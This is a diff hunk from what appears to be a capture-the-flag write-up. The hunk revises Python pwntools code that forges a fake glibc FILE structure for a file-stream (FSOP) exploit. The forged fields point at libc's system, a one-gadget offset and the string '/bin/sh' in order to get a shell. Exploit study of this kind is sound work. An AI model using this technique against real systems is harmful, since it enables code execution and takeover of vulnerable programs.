@@ -95,8 +95,7 @@ Next I  overwrote (is that how you say it??) the write file structure to point t
 Then I created a fake file structure while changing the `vtable` pointer to what angry-fsrop said:
 ``` python 
 # create a fake file struct to use when calling the write stream
-    file = FileStructure(0)
-    file.flags = 0x3b01010101010101
+    file = FileStructure()
     file._IO_read_end = l.sym["system"] + libc
     file._IO_save_base = libc + 0x163830 # one gadget
     file._IO_write_end = u64(b"/bin/sh\x00")
